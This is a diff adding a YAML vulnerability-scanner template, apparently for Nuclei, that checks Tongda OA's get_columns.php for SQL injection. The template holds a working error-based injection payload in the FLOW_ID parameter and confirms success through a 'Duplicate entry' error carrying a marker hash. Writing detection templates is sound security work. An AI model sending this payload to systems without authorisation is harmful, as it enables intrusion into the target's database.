@@ -1,0 +1,24 @@
+id: poc-yaml-tongda-oa-query-get-columns-sqli
+info:
+  name: Tongda OA /query/get_columns.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/general/workflow/query/get_columns.php?FLOW_ID=11%BF%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),md5({{t1}}),1,1)a%20from%20information_schema.tables%20group%20by%20a)b)%23"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Duplicate entry"
+      - type: word
+        words:
+          - "{{t2}}"
